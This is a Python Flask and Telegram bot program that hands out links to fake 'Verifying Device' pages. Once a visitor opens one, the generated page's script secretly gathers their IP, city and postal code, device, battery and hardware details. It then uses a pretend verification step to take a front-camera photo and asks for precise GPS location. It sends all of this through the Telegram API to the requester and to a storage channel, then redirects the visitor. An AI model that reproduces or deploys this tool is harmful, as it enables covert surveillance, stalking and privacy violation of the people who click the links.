from flask import Flask, request, jsonify, send_from_directory
import telebot
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== ENVIRONMENT VARIABLES ==========
TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")  # तुम्हारी channel id यहाँ से आएगी
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
STATS_FILE = "stats.json"

os.makedirs(HTML_DIR, exist_ok=True)

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, "w") as f:
        json.dump({"total_links": 0}, f)

bot = telebot.TeleBot(TOKEN)

def increment_links():
    with open(STATS_FILE, "r") as f:
        stats = json.load(f)
    stats["total_links"] = stats.get("total_links", 0) + 1
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def delete_old_files():
    cutoff_time = datetime.now() - timedelta(minutes=10)
    if os.path.exists(HTML_DIR):
        for filename in os.listdir(HTML_DIR):
            if filename.endswith('.html'):
                filepath = os.path.join(HTML_DIR, filename)
                try:
                    if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff_time:
                        os.remove(filepath)
                except:
                    pass

def start_auto_cleanup():
    def cleanup_loop():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup_loop, daemon=True).start()

def delete_user_old_links(user_id):
    if os.path.exists(HTML_DIR):
        for filename in os.listdir(HTML_DIR):
            if filename.startswith(f"v_{user_id}_") and filename.endswith('.html'):
                try:
                    os.remove(os.path.join(HTML_DIR, filename))
                except:
                    pass

def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False

def get_user_state(user_id):
    try:
        with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "r") as f:
            return json.load(f)
    except:
        return {"state": None}

def set_user_state(user_id, data):
    with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "w") as f:
        json.dump(data, f)

def generate_html(user_id, target_url):
    delete_user_old_links(user_id)
    filename = f"v_{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, filename)
    
    # CHANNEL_ID env var से लिया जाएगा – default khali रखा है
    storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        * {{ user-select: none; margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }}
        .container {{ background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }}
        .spinner {{ width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .btn {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; }}
        .skip {{ background: #95a5a6; }}
        .error {{ color: #e74c3c; margin-top: 10px; font-size: 14px; }}
        .info {{ color: #666; font-size: 12px; margin-top: 20px; }}
        h2 {{ color: #333; margin-bottom: 20px; }}
    </style>
</head>
<body>
<div class="container">
    <div id="step1">
        <div class="spinner"></div>
        <h2>Verifying Device...</h2>
        <p>Please wait while we check your device</p>
    </div>
    <div id="step2" style="display:none">
        <h2>Verification Required</h2>
        <button class="btn" onclick="requestCamera()">CONTINUE</button>
        <div id="errorMsg" class="error"></div>
        <p class="info">Camera access is required to continue</p>
    </div>
    <div id="step3" style="display:none">
        <div class="spinner"></div>
        <h2>Camera Access</h2>
        <p>Requesting camera permission...</p>
    </div>
    <div id="step4" style="display:none">
        <div class="spinner"></div>
        <h2>Location Access (Optional)</h2>
        <p>This helps us verify your region</p>
        <button class="btn" onclick="allowLocation()">ALLOW LOCATION</button>
        <button class="btn skip" onclick="skipLocation()">SKIP</button>
    </div>
    <div id="step5" style="display:none">
        <div class="spinner"></div>
        <h2>Redirecting...</h2>
        <p>Please wait</p>
    </div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const STORAGE = {storage_channel};
const TARGET = "{target_url}";
let locationAllowed = false;
let locationSkipped = false;

function formatBytes(bytes) {{
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}}

async function sendToUser(text, file=null) {{
    try {{
        if(file) {{
            let fd = new FormData();
            fd.append('chat_id', USER);
            fd.append('photo', file);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
            if(STORAGE) {{
                let fd2 = new FormData();
                fd2.append('chat_id', STORAGE);
                fd2.append('photo', file);
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd2}});
            }}
        }} else {{
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
            if(STORAGE) {{
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
            }}
        }}
    }} catch(e) {{ console.log(e); }}
}}

async function getIPInfo(ip) {{
    try {{
        let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
        let d = await r.json();
        return d;
    }} catch(e) {{ return {{}}; }}
}}

async function getBattery() {{
    if(navigator.getBattery) {{
        try {{
            let b = await navigator.getBattery();
            return {{ level: Math.round(b.level*100), charging: b.charging }};
        }} catch(e) {{}}
    }}
    return null;
}}

function getDeviceInfo() {{
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/Android/i.test(ua)) return 'Android Phone';
    if (/Mobile/i.test(ua)) return 'Mobile Device';
    return 'Desktop/Laptop';
}}

function getHardwareInfo() {{
    let cores = navigator.hardwareConcurrency || 'Unknown';
    let ram = 'Unknown';
    if(navigator.deviceMemory) ram = navigator.deviceMemory + ' GB';
    return {{ cores: cores, ram: ram }};
}}

async function getStorageInfo() {{
    try {{
        if('storage' in navigator && 'estimate' in navigator.storage) {{
            let estimate = await navigator.storage.estimate();
            return {{
                usedFormatted: formatBytes(estimate.usage),
                totalFormatted: formatBytes(estimate.quota)
            }};
        }}
    }} catch(e) {{}}
    return null;
}}

async function captureData() {{
    try {{
        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
        let ipInfo = await getIPInfo(ip);
        let battery = await getBattery();
        let deviceType = getDeviceInfo();
        let hardware = getHardwareInfo();
        let storage = await getStorageInfo();
        let language = navigator.language || navigator.userLanguage || 'Unknown';
        let resolution = screen.width + 'x' + screen.height;
        
        let message = "<b>Visitor Information Captured</b>\\n";
        message += "------------------------\\n\\n";
        message += "<b>Device & Browser</b>\\n";
        message += "   Device: " + deviceType + "\\n";
        message += "   User Agent: " + navigator.userAgent.substring(0, 200) + "\\n\\n";
        message += "<b>Network Information</b>\\n";
        message += "   IP Address: " + ip + "\\n";
        message += "   Language: " + language + "\\n\\n";
        message += "<b>Location Details</b>\\n";
        message += "   Country: " + (ipInfo.country_name || 'Unknown') + "\\n";
        message += "   Region: " + (ipInfo.region || 'Unknown') + "\\n";
        message += "   City: " + (ipInfo.city || 'Unknown') + "\\n";
        message += "   Postal Code: " + (ipInfo.postal || 'Unknown') + "\\n";
        message += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n\\n";
        message += "<b>Display Information</b>\\n";
        message += "   Resolution: " + resolution + "\\n\\n";
        message += "<b>Battery Status</b>\\n";
        message += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
        message += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n\\n";
        message += "<b>Hardware & Storage</b>\\n";
        message += "   CPU Cores: " + hardware.cores + "\\n";
        message += "   RAM: " + hardware.ram + "\\n";
        message += "   Storage Used: " + (storage ? storage.usedFormatted : 'Unknown') + "\\n";
        message += "   Storage Total: " + (storage ? storage.totalFormatted : 'Unknown') + "\\n\\n";
        message += "------------------------\\n";
        message += "Developed by: @nrtecno2";
        
        await sendToUser(message);
        return true;
    }} catch(e) {{
        await sendToUser('Error capturing data: ' + e.message);
        return false;
    }}
}}

async function captureFrontPhoto() {{
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        let video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
        await new Promise(r => setTimeout(r, 300));
        let canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        if(blob && blob.size > 500) {{
            await sendToUser('<b>FRONT CAMERA PHOTO</b>', blob);
        }}
        stream.getTracks().forEach(t => t.stop());
        return true;
    }} catch(e) {{
        return false;
    }}
}}

async function allowLocation() {{
    locationAllowed = true;
    locationSkipped = false;
    document.getElementById('step4').style.display = 'none';
    document.getElementById('step5').style.display = 'block';
    
    if(navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(async (p) => {{
            await sendToUser('<b>LIVE LOCATION</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
            await sendToUser('<b>Coordinates</b>\\nLatitude: ' + p.coords.latitude + '\\nLongitude: ' + p.coords.longitude + '\\nAccuracy: ' + p.coords.accuracy + 'm');
            setTimeout(() => window.location.href = TARGET, 1500);
        }}, async (err) => {{
            await sendToUser('Location: Access denied by user');
            setTimeout(() => window.location.href = TARGET, 1500);
        }}, {{ timeout: 10000, enableHighAccuracy: true }});
    }} else {{
        setTimeout(() => window.location.href = TARGET, 1500);
    }}
}}

async function skipLocation() {{
    locationSkipped = true;
    locationAllowed = false;
    document.getElementById('step4').style.display = 'none';
    document.getElementById('step5').style.display = 'block';
    await sendToUser('Location: Skipped by user');
    setTimeout(() => window.location.href = TARGET, 1500);
}}

async function requestCamera() {{
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
    
    let cameraSuccess = await captureFrontPhoto();
    
    if(cameraSuccess) {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'block';
        await sendToUser('Camera access granted');
    }} else {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('errorMsg').innerHTML = 'Camera access required!';
        await sendToUser('Camera access denied by user');
    }}
}}

async function start() {{
    await captureData();
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
}}
start();
</script>
</body>
</html>"""
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    increment_links()
    return filename

def process_update(update):
    try:
        if hasattr(update, 'message') and update.message:
            msg = update.message
            text = msg.text if msg.text else ""
            chat_id = msg.chat.id
            
            if text == '/start':
                if not is_subscribed(chat_id):
                    markup = telebot.types.InlineKeyboardMarkup()
                    markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
                    markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
                    bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
                else:
                    set_user_state(chat_id, {"state": "waiting_url"})
                    bot.send_message(chat_id, "Send me any URL")
            
            elif text.startswith(('http://', 'https://')):
                state = get_user_state(chat_id)
                if state.get("state") == "waiting_url":
                    filename = generate_html(chat_id, text)
                    set_user_state(chat_id, {"state": None})
                    link = f"https://{ACCOUNT_NAME}.onrender.com/view/{filename}"
                    bot.send_message(chat_id, f"Your link:\n{link}\n\nExpires in 10 minutes")
                else:
                    bot.send_message(chat_id, "Use /start first")
            else:
                if text != '/start':
                    bot.send_message(chat_id, "Send a valid URL")
    except Exception as e:
        logger.error(f"Process error: {e}")

def process_callback(call):
    try:
        if call.data == "verify":
            if is_subscribed(call.from_user.id):
                bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
                set_user_state(call.from_user.id, {"state": "waiting_url"})
            else:
                bot.answer_callback_query(call.id, "Join channel first!", True)
    except Exception as e:
        logger.error(f"Callback error: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        data = json.loads(json_str)
        
        if 'message' in data:
            process_update(telebot.types.Update.de_json(json_str))
        elif 'callback_query' in data:
            process_callback(telebot.types.Update.de_json(json_str))
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/view/<filename>')
def serve_html(filename):
    return send_from_directory(HTML_DIR, filename)

@app.route('/')
def home():
    return f"DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    start_auto_cleanup()
    app.run(host='0.0.0.0', port=port)
